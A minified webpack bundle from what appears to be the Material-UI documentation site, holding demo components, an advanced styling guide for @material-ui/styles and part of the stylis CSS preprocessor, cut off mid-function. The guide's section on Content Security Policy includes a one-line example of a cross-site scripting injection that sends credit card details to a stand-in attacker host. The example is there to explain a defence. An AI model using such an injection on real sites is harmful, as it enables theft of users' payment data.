(window.webpackJsonp=window.webpackJsonp||[]).push([["d1ba"],{"+j9t":function(e,n,t){"use strict";var s=t("z3IF"),r=t("2Fjn"),o=t("Rbzu"),a=t("mXGw"),i=t.n(a),l=t("PDtE"),c=t("ADfD"),d=t("Hg0Q"),u=t("XpU0"),m=i.a.forwardRef(function(e,n){var t=e.classes,o=e.className,a=e.component,u=void 0===a?"p":a,m=(e.disabled,e.error,e.filled,e.focused,e.margin,e.required,e.variant,Object(r.a)(e,["classes","className","component","disabled","error","filled","focused","margin","required","variant"])),p=Object(d.a)(),h=Object(c.a)({props:e,muiFormControl:p,states:["variant","margin","disabled","error","filled","focused","required"]});return i.a.createElement(u,Object(s.default)({className:Object(l.a)(t.root,("filled"===h.variant||"outlined"===h.variant)&&t.contained,o,h.disabled&&t.disabled,h.error&&t.error,h.filled&&t.filled,h.focused&&t.focused,h.required&&t.required,{dense:t.marginDense}[h.margin]),ref:n},m))});n.a=Object(u.default)(function(e){return{root:Object(o.a)({color:e.palette.text.secondary},e.typography.caption,{textAlign:"left",marginTop:8,lineHeight:"1em",minHeight:"1em",margin:0,"&$disabled":{color:e.palette.text.disabled},"&$error":{color:e.palette.error.main}}),error:{},disabled:{},marginDense:{marginTop:4},contained:{margin:"8px 12px 0"},focused:{},filled:{},required:{}}},{name:"MuiFormHelperText"})(m)},"/+Qa":function(e,n){e.exports="import React from 'react';\nimport { ThemeProvider, makeStyles } from '@material-ui/styles';\n\nconst useStyles = makeStyles(theme => ({\n  root: {\n    background: theme.background,\n    border: 0,\n    fontSize: 16,\n    borderRadius: 3,\n    boxShadow: '0 3px 5px 2px rgba(255, 105, 135, .3)',\n    color: 'white',\n    height: 48,\n    padding: '0 30px',\n  },\n}));\n\nfunction DeepChild() {\n  const classes = useStyles();\n\n  return (\n    <button type=\"button\" className={classes.root}>\n      Theming\n    </button>\n  );\n}\n\nconst themeInstance = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nexport default function Theming() {\n  return (\n    <ThemeProvider theme={themeInstance}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n"},"005G":function(e,n,t){"use strict";t.d(n,"b",function(){return d});var s=t("z3IF"),r=t("2Fjn"),o=t("mXGw"),a=t.n(o),i=t("GeWT"),l=t.n(i),c=t("mii5");function d(){var e=(arguments.length>0&&void 0!==arguments[0]?arguments[0]:{}).defaultTheme;return function(n){var t=a.a.forwardRef(function(t,o){var i=t.innerRef,l=Object(r.a)(t,["innerRef"]),d=Object(c.a)()||e;return a.a.createElement(n,Object(s.default)({theme:d,ref:i||o},l))});return l()(t,n),t}}var u=d();n.a=u},"1ZeO":function(e,n,t){"use strict";t.r(n),t.d(n,"default",function(){return m});var s=t("kGIj"),r=t("mXGw"),o=t.n(r),a=t("UutA"),i=t("nx5Z"),l=t("WKBU");function c(){var e=Object(s.a)(["\n  label.Mui-focused {\n    color: green;\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red;\n    }\n    &:hover fieldset {\n      border-color: yellow;\n    }\n    &.Mui-focused fieldset {\n      border-color: green;\n    }\n  }\n"]);return c=function(){return e},e}var d=Object(a.b)(i.a)(c()),u=o.a.createElement(l.a,null,o.a.createElement(d,{label:"Deterministic",variant:"outlined",id:"deterministic-outlined-input"}));function m(){return u}},"21kb":function(e,n){e.exports="# Advanced\n\n<p class=\"description\">This section covers more advanced usage of @material-ui/styles.</p>\n\n## Theming\n\nAdd a `ThemeProvider` to the top level of your app to pass the theme down the React component tree. Then, you can access the theme object in style functions.\n\n```jsx\nimport { ThemeProvider } from '@material-ui/styles';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### Accessing the theme in a component\n\nYou might need to access the theme variables inside your React components.\n\n#### `useTheme` hook\n\n```jsx\nimport { useTheme } from '@material-ui/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\n```jsx\nimport { withTheme } from '@material-ui/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### Theme nesting\n\nYou can nest multiple theme providers.\nThis can be really useful when dealing with different areas of your application that have distinct appearance from each other.\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\nThe inner theme will **override** the outer theme.\nYou can extend the outer theme by providing a function:\n\n```jsx\n<ThemeProvider theme={…} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## Overriding styles - `classes` prop\n\nThe `makeStyles` (hook generator) and `withStyles` (HOC) APIs allow the creation of multiple style rules per style sheet. Each style rule has its own class name.\nThe class names are provided to the component with the `classes` variable.\nThis is particularly useful when styling nested elements in a component.\n\n```jsx\n// A style sheet\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}> // 'jss1'\n      <span className={classes.label}> // 'jss2'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />\n}\n```\n\nHowever, the class names are often non-deterministic. How can a parent component override the style of a nested element?\n\n### withStyles\n\nThis is the simplest case. the wrapped component accepts a `classes` prop,\nit simply merges the class names provided with the style sheet.\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}> // 'jss2 my-label'\n      Nested\n    </span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n### makeStyles\n\nThe hook API requires a bit more work. You have to forward the parent props to the hook as a first argument.\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}> // 'jss2 my-label'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n## JSS plugins\n\nJSS uses plugins to extend its core, allowing you to cherry-pick the features you need,\nand only pay the performance overhead for what you are using.\n\nNot all the plugins are available in Material-UI by default. The following (which is a subset of\n[jss-preset-default](https://cssinjs.org/jss-preset-default/)) are included:\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)\n\nOf course, you are free to use additional plugins. Here is an example with the [jss-rtl](https://github.com/alitaheri/jss-rtl) plugin.\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\nimport rtl from 'jss-rtl'\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nfunction App() {\n  return (\n    <StylesProvider jss={jss}>\n      ...\n    </StylesProvider>\n  );\n}\n\nexport default App;\n```\n\n## String templates\n\nIf you prefer CSS syntax over JSS, you can use the [jss-plugin-template](https://cssinjs.org/jss-plugin-template/) plugin.\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\nNote that this doesn't support selectors, or nested rules.\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## CSS injection order\n\n> It's **really important** to understand how the CSS specificity is calculated by the browser.\nIt's one of the key elements to know when overriding styles.\nWe **encourage** you to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)\n\nBy default, the style tags are injected **last** in the `<head>` element of the page.\nThey gain more specificity than any other style tags on your page e.g. CSS modules, styled components.\n\n### injectFirst\n\nThe `StylesProvider` component has an `injectFirst` prop to inject the style tags **first** in the head (less priority):\n\n```jsx\nimport { StylesProvider } from '@material-ui/styles';\n\n<StylesProvider injectFirst>\n  {/* Your component tree.\n      Styled components can override Material-UI's styles. */}\n</StylesProvider>\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\nThe injection of style tags happens in the **same order** as the `makeStyles` / `withStyles` / `styled` invocations. For instance the color red wins in this case:\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // 🔵\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // 🔴\n  },\n});\n\nexport default function MyComponent() {\n  // Order doesn't matter\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Order doesn't matter\n  const className = clsx(classes.root, classesBase.root)\n\n  // color: red 🔴 wins.\n  return <div className={className} />;\n}\n```\n\nThe hook call order and the class name concatenation order **don't matter**.\n\n### insertionPoint\n\nJSS [provides a mechanism](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) to control this situation.\nBy adding an `insertionPoint` within the HTML you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.\n\n#### HTML comment\n\nThe simplest approach is to add an HTML comment to the `<head>` that determines where JSS will inject the styles:\n\n```html\n<head>\n  \x3c!-- jss-insertion-point --\x3e\n  <link href=\"...\">\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n#### Other HTML element\n\n[Create React App](https://github.com/facebook/create-react-app) strips HTML comments when creating the production build.\nTo get around this issue, you can provide a DOM element (other than a comment) as the JSS insertion point, for example, a `<noscript>` element:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n#### JS createComment\n\ncodesandbox.io prevents access to the `<head>` element.\nTo get around this issue, you can use the JavaScript `document.createComment()` API:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n## Server-side rendering\n\nThis example returns a string of HTML and inlines the critical CSS required, right before it’s used:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nYou can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets`](/styles/api/#serverstylesheets) API documentation.\n\n### Gatsby\n\nWe have [an official plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`.\nRefer to the plugin's page for setup and usage instructions.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/gatsby) for an up-to-date usage example.\n\n### Next.js\n\nYou need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/master/examples/nextjs/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/nextjs) for an up-to-date usage example.\n\n## Class names\n\nThe class names are generated by [the class name generator](/styles/api/#creategenerateclassname-options-class-name-generator).\n\n### Default\n\nBy default, the class names generated by `@material-ui/styles` are **non-deterministic**; you can't rely on them to stay the same. Let's take the following style as an example:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nThis will generate a class name such as `makeStyles-root-123`.\n\nYou have to use the `classes` prop of a component to override the styles.\nThe non-deterministic nature of the class names enables style isolation.\n\n- In **development**, the class name is: `.makeStyles-root-123`, following this logic:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- In **production**, the class name is: `.jss123`, following this logic:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### With `@material-ui/core`\n\nThe generated class names of the `@material-ui/core` components behave differently.\nWhen the following conditions are met, the class names are **deterministic**:\n\n- Only one theme provider is used (**No theme nesting**)\n- The style sheet has a name that starts with `Mui` (all Material-UI components).\n- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).\n\nThese conditions are met with the most common use cases of `@material-ui/core`.\nFor instance, this style sheet:\n\n```jsx\nconst useStyles = makeStyles({\n  root: { /* … */ },\n  label: { /* … */ },\n  outlined: {\n    /* … */\n    '&$disabled': { /* … */ },\n  },\n  outlinedPrimary: {\n    /* … */\n    '&:hover': { /* … */ },\n  },\n  disabled: {},\n}, { name: 'MuiButton' });\n```\n\ngenerates the following class names that you can override:\n\n```css\n.MuiButton-root { /* … */ }\n.MuiButton-label { /* … */ }\n.MuiButton-outlined { /* … */ }\n.MuiButton-outlined.Mui-disabled { /* … */ }\n.MuiButton-outlinedPrimary: { /* … */ }\n.MuiButton-outlinedPrimary:hover { /* … */ }\n```\n\n*This is a simplification of the `@material-ui/core/Button` component's style sheet.*\n\nCustomization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the the classes prop.\nIt's easier to use the default values, as described above. For example:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; 💚\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; 💔\n    }\n    &:hover fieldset {\n      border-color: yellow; 💛\n    }\n    &.Mui-focused fieldset {\n      border-color: green; 💚\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## Global CSS\n\n### `jss-plugin-global`\n\nThe [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset.\nYou can use it to define global class names.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### Hybrid\n\nYou can also combine JSS generated class names with global ones.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## CSS prefixes\n\nJSS uses feature detection to apply the correct prefixes.\n[Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.\n\n## Content Security Policy (CSP)\n\n### What is CSP and why is it useful?\n\nBasically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:\n\n```html\n<script>\n  sendCreditCardDetails('https://hostile.example');\n<\/script>\n```\n\nThis vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.\n\nYou can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n### How does one implement CSP?\n\nIn order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.\n\nA CSP nonce is a Base 64 encoded string. You can generate one like this:\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\nIt is very important that you use UUID version 4, as it generates an **unpredictable** string.\nYou then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:\n\n```js\nheader('Content-Security-Policy')\n  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);\n```\n\nIf you are using Server-Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: sheets.toString() }}\n/>\n```\n\nThen, you must pass this nonce to JSS so it can add it to subsequent `<style>` tags.\nThe client-side gets the nonce from a header. You must include this header regardless of whether or not SSR is used.\n\n```jsx\n<meta property=\"csp-nonce\" content={nonce} />\n```\n"},"2FG1":function(e,n,t){"use strict";t.r(n),t.d(n,"default",function(){return c});var s=t("mXGw"),r=t.n(s),o=t("e+1t"),a=t("YmTL"),i=t("xkj/"),l=r.a.createElement(o.a,{req:a,reqSource:i,reqPrefix:"pages/styles/advanced"});function c(){return l}},"3Biu":function(e,n,t){"use strict";t.r(n),t.d(n,"default",function(){return l});var s=t("mXGw"),r=t.n(s),o=t("mii5"),a=t("h7Hf");var i=r.a.createElement(function(){var e=Object(o.a)();return r.a.createElement("span",null,"spacing ".concat(e.spacing))},null);function l(){return r.a.createElement(a.a,{theme:{spacing:"8px"}},i)}},"4Tsr":function(e,n,t){"use strict";t.r(n),t.d(n,"default",function(){return h});var s=t("Rbzu"),r=t("mXGw"),o=t.n(r),a=t("3O2h"),i=t("h7Hf"),l=Object(a.a)(function(e){return{root:{background:e.background,border:0,fontSize:16,borderRadius:3,boxShadow:e.boxShadow,color:"white",height:48,padding:"0 30px"}}});function c(){var e=l();return o.a.createElement("button",{type:"button",className:e.root},"Theme nesting")}var d=o.a.createElement(c,null),u=o.a.createElement("br",null),m=o.a.createElement("br",null),p=o.a.createElement(c,null);function h(){return o.a.createElement("div",null,o.a.createElement(i.a,{theme:{background:"linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)",boxShadow:"0 3px 5px 2px rgba(255, 105, 135, .3)"}},d,u,m,o.a.createElement(i.a,{theme:function(e){return Object(s.a)({},e,{background:"linear-gradient(45deg, #2196F3 30%, #21CBF3 90%)",boxShadow:"0 3px 5px 2px rgba(33, 203, 243, .3)"})}},p)))}},"4XoQ":function(e,n,t){e.exports=function e(n){"use strict";var t=/^\0+/g,s=/[\0\r\f]/g,r=/: */g,o=/zoo|gra/,a=/([,: ])(transform)/g,i=/,+\s*(?![^(]*[)])/g,l=/ +\s*(?![^(]*[)])/g,c=/ *[\0] */g,d=/,\r+?/g,u=/([\t\r\n ])*\f?&/g,m=/:global\(((?:[^\(\)\[\]]*|\[.*\]|\([^\(\)]*\))*)\)/g,p=/\W+/g,h=/@(k\w+)\s*(\S*)\s*/,f=/::(place)/g,g=/:(read-only)/g,y=/\s+(?=[{\];=:>])/g,b=/([[}=:>])\s+/g,v=/(\{[^{]+?);(?=\})/g,S=/\s{2,}/g,j=/([^\(])(:+) */g,w=/[svh]\w+-[tblr]{2}/,x=/\(\s*(.*)\s*\)/g,P=/([\s\S]*?);/g,T=/-self|flex-/g,C=/[^]*?(:[rp][el]a[\w-]+)[^]*/,k=/stretch|:\s*\w+\-(?:conte|avail)/,N=/([^-])(image-set\()/,O="-webkit-",M="-moz-",A="-ms-",I=59,D=125,E=123,R=40,B=41,F=91,H=93,z=10,$=13,W=9,L=64,J=32,q=38,U=45,G=95,Y=42,_=44,X=58,V=39,K=34,Z=47,Q=62,ee=43,ne=126,te=0,se=12,re=11,oe=107,ae=109,ie=115,le=112,ce=111,de=105,ue=99,me=100,pe=112,he=1,fe=1,ge=0,ye=1,be=1,ve=1,Se=0,je=0,we=0,xe=[],Pe=[],Te=0,Ce=null,ke=-2,Ne=-1,Oe=0,Me=1,Ae=2,Ie=3,De=0,Ee=1,Re="",Be="",Fe="";function He(e,n,r,o,a){for(var i,l,d=0,u=0,m=0,p=0,y=0,b=0,v=0,S=0,w=0,P=0,T=0,C=0,k=0,N=0,G=0,Se=0,Pe=0,Ce=0,ke=0,Ne=r.length,$e=Ne-1,Ge="",Ye="",_e="",Xe="",Ve="",Ke="";G<Ne;){if(v=r.charCodeAt(G),G===$e&&u+p+m+d!==0&&(0!==u&&(v=u===Z?z:Z),p=m=d=0,Ne++,$e++),u+p+m+d===0){if(G===$e&&(Se>0&&(Ye=Ye.replace(s,"")),Ye.trim().length>0)){switch(v){case J:case W:case I:case $:case z:break;default:Ye+=r.charAt(G)}v=I}if(1===Pe)switch(v){case E:case D:case I:case K:case V:case R:case B:case _:Pe=0;case W:case $:case z:case J:break;default:for(Pe=0,ke=G,y=v,G--,v=I;ke<Ne;)switch(r.charCodeAt(ke++)){case z:case $:case I:++G,v=y,ke=Ne;break;case X:Se>0&&(++G,v=y);case E:ke=Ne}}switch(v){case E:for(y=(Ye=Ye.trim()).charCodeAt(0),T=1,ke=++G;G<Ne;){switch(v=r.charCodeAt(G)){case E:T++;break;case D:T--;break;case Z:switch(b=r.charCodeAt(G+1)){case Y:case Z:G=Ue(b,G,$e,r)}break;case F:v++;case R:v++;case K:case V:for(;G++<$e&&r.charCodeAt(G)!==v;);}if(0===T)break;G++}switch(_e=r.substring(ke,G),y===te&&(y=(Ye=Ye.replace(t,"").trim()).charCodeAt(0)),y){case L:switch(Se>0&&(Ye=Ye.replace(s,"")),b=Ye.charCodeAt(1)){case me:case ae:case ie:case U:i=n;break;default:i=xe}if(ke=(_e=He(n,i,_e,b,a+1)).length,we>0&&0===ke&&(ke=Ye.length),Te>0&&(i=ze(xe,Ye,Ce),l=qe(Ie,_e,i,n,fe,he,ke,b,a,o),Ye=i.join(""),void 0!==l&&0===(ke=(_e=l.trim()).length)&&(b=0,_e="")),ke>0)switch(b){case ie:Ye=Ye.replace(x,Je);case me:case ae:case U:_e=Ye+"{"+_e+"}";break;case oe:_e=(Ye=Ye.replace(h,"$1 $2"+(Ee>0?Re:"")))+"{"+_e+"}",_e=1===be||2===be&&Le("@"+_e,3)?"@"+O+_e+"@"+_e:"@"+_e;break;default:_e=Ye+_e,o===pe&&(Xe+=_e,_e="")}else _e="";break;default:_e=He(n,ze(n,Ye,Ce),_e,o,a+1)}Ve+=_e,C=0,Pe=0,N=0,Se=0,Ce=0,k=0,Ye="",_e="",v=r.charCodeAt(++G);break;case D:case I:if((ke=(Ye=(Se>0?Ye.replace(s,""):Ye).trim()).length)>1)switch(0===N&&((y=Ye.charCodeAt(0))===U||y>96&&y<123)&&(ke=(Ye=Ye.replace(" ",":")).length),Te>0&&void 0!==(l=qe(Me,Ye,n,e,fe,he,Xe.length,o,a,o))&&0===(ke=(Ye=l.trim()).length)&&(Ye="\0\0"),y=Ye.charCodeAt(0),b=Ye.charCodeAt(1),y){case te:break;case L:if(b===de||b===ue){Ke+=Ye+r.charAt(G);break}default:if(Ye.charCodeAt(ke-1)===X)break;Xe+=We(Ye,y,b,Ye.charCodeAt(2))}C=0,Pe=0,N=0,Se=0,Ce=0,Ye="",v=r.charCodeAt(++G)}}switch(v){case $:case z:if(u+p+m+d+je===0)switch(P){case B:case V:case K:case L:case ne:case Q:case Y:case ee:case Z:case U:case X:case _:case I:case E:case D:break;default:N>0&&(Pe=1)}u===Z?u=0:ye+C===0&&o!==oe&&Ye.length>0&&(Se=1,Ye+="\0"),Te*De>0&&qe(Oe,Ye,n,e,fe,he,Xe.length,o,a,o),he=1,fe++;break;case I:case D:if(u+p+m+d===0){he++;break}default:switch(he++,Ge=r.charAt(G),v){case W:case J:if(p+d+u===0)switch(S){case _:case X:case W:case J:Ge="";break;default:v!==J&&(Ge=" ")}break;case te:Ge="\\0";break;case se:Ge="\\f";break;case re:Ge="\\v";break;case q:p+u+d===0&&ye>0&&(Ce=1,Se=1,Ge="\f"+Ge);break;case 108:if(p+u+d+ge===0&&N>0)switch(G-N){case 2:S===le&&r.charCodeAt(G-3)===X&&(ge=S);case 8:w===ce&&(ge=w)}break;case X:p+u+d===0&&(N=G);break;case _:u+m+p+d===0&&(Se=1,Ge+="\r");break;case K:case V:0===u&&(p=p===v?0:0===p?v:p);break;case F:p+u+m===0&&d++;break;case H:p+u+m===0&&d--;break;case B:p+u+d===0&&m--;break;case R:if(p+u+d===0){if(0===C)switch(2*S+3*w){case 533:break;default:T=0,C=1}m++}break;case L:u+m+p+d+N+k===0&&(k=1);break;case Y:case Z:if(p+d+m>0)break;switch(u){case 0:switch(2*v+3*r.charCodeAt(G+1)){case 235:u=Z;break;case 220:ke=G,u=Y}break;case Y:v===Z&&S===Y&&ke+2!==G&&(33===r.charCodeAt(ke+2)&&(Xe+=r.substring(ke,G+1)),Ge="",u=0)}}if(0===u){if(ye+p+d+k===0&&o!==oe&&v!==I)switch(v){case _:case ne:case Q:case ee:case B:case R:if(0===C){switch(S){case W:case J:case z:case $:Ge+="\0";break;default:Ge="\0"+Ge+(v===_?"":"\0")}Se=1}else switch(v){case R:N+7===G&&108===S&&(N=0),C=++T;break;case B:0==(C=--T)&&(Se=1,Ge+="\0")}break;case W:case J:switch(S){case te:case E:case D:case I:case _:case se:case W:case J:case z:case $:break;default:0===C&&(Se=1,Ge+="\0")}}Ye+=Ge,v!==J&&v!==W&&(P=v)}}w=S,S=v,G++}if(ke=Xe.length,we>0&&0===ke&&0===Ve.length&&0===n[0].length==0&&(o!==ae||1===n.length&&(ye>0?Be:Fe)===n[0])&&(ke=n.join(",").length+2),ke>0){if(i=0===ye&&o!==oe?function(e){for(var n,t,r=0,o=e.length,a=Array(o);r<o;++r){for(var i=e[r].split(c),l="",d=0,u=0,m=0,p=0,h=i.length;d<h;++d)if(!(0===(u=(t=i[d]).length)&&h>1)){if(m=l.charCodeAt(l.length-1),p=t.charCodeAt(0),n="",0!==d)switch(m){case Y:case ne:case Q:case ee:case J:case R:break;default:n=" "}switch(p){case q:t=n+Be;case ne:case Q:case ee:case J:case B:case R:break;case F:t=n+t+Be;break;case X:switch(2*t.charCodeAt(1)+3*t.charCodeAt(2)){case 530:if(ve>0){t=n+t.substring(8,u-1);break}default:(d<1||i[d-1].length<1)&&(t=n+Be+t)}break;case _:n="";default:t=u>1&&t.indexOf(":")>0?n+t.replace(j,"$1"+Be+"$2"):n+t+Be}l+=t}a[r]=l.replace(s,"").trim()}return a}(n):n,Te>0&&void 0!==(l=qe(Ae,Xe,i,e,fe,he,ke,o,a,o))&&0===(Xe=l).length)return Ke+Xe+Ve;if(Xe=i.join(",")+"{"+Xe+"}",be*ge!=0){switch(2!==be||Le(Xe,2)||(ge=0),ge){case ce:Xe=Xe.replace(g,":"+M+"$1")+Xe;break;case le:Xe=Xe.replace(f,"::"+O+"input-$1")+Xe.replace(f,"::"+M+"$1")+Xe.replace(f,":"+A+"input-$1")+Xe}ge=0}}return Ke+Xe+Ve}function ze(e,n,t){var s=n.trim().split(d),r=s,o=s.length,a=e.length;switch(a){case 0:case 1:for(var i=0,l=0===a?"":e[0]+" ";i<o;++i)r[i]=$e(l,r[i],t,a).trim();break;default:i=0;var c=0;for(r=[];i<o;++i)for(var u=0;u<a;++u)r[c++]=$e(e[u]+" ",s[i],t,a).trim()}return r}function $e(e,n,t,s){var r=n,o=r.charCodeAt(0);switch(o<33&&(o=(r=r.trim()).charCodeAt(0)),o){case q:switch(ye+s){case 0:case 1:if(0===e.trim().length)break;default:return r.replace(u,"$1"+e.trim())}break;case X:switch(r.charCodeAt(1)){case 103:if(ve>0&&ye>0)return r.replace(m,"$1").replace(u,"$1"+Fe);break;default:return e.trim()+r.replace(u,"$1"+e.trim())}default:if(t*ye>0&&r.indexOf("\f")>0)return r.replace(u,(e.charCodeAt(0)===X?"":"$1")+e.trim())}return e+r}function We(e,n,t,s){var c,d=0,u=e+";",m=2*n+3*t+4*s;if(944===m)return function(e){var 